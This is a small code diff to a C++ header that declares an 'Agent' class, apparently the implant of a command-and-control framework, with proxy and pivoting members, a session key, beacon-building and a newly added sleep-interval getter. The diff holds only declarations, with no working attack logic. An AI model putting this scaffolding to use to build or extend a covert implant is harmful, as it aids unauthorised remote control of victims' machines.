@@ -23,11 +23,14 @@ public:
 	Proxyfire*		proxyfire	= NULL;
 	Pivotter*       pivotter    = NULL;
 
+	Map<CHAR*, LPVOID> Values;
+
 	BYTE* SessionKey = NULL;
 
 	Agent();
 
 	void  SetActive(BOOL state);
 	BOOL  IsActive();
+	ULONG GetWorkingSleep();
 	BYTE* BuildBeat(ULONG* size);
 };
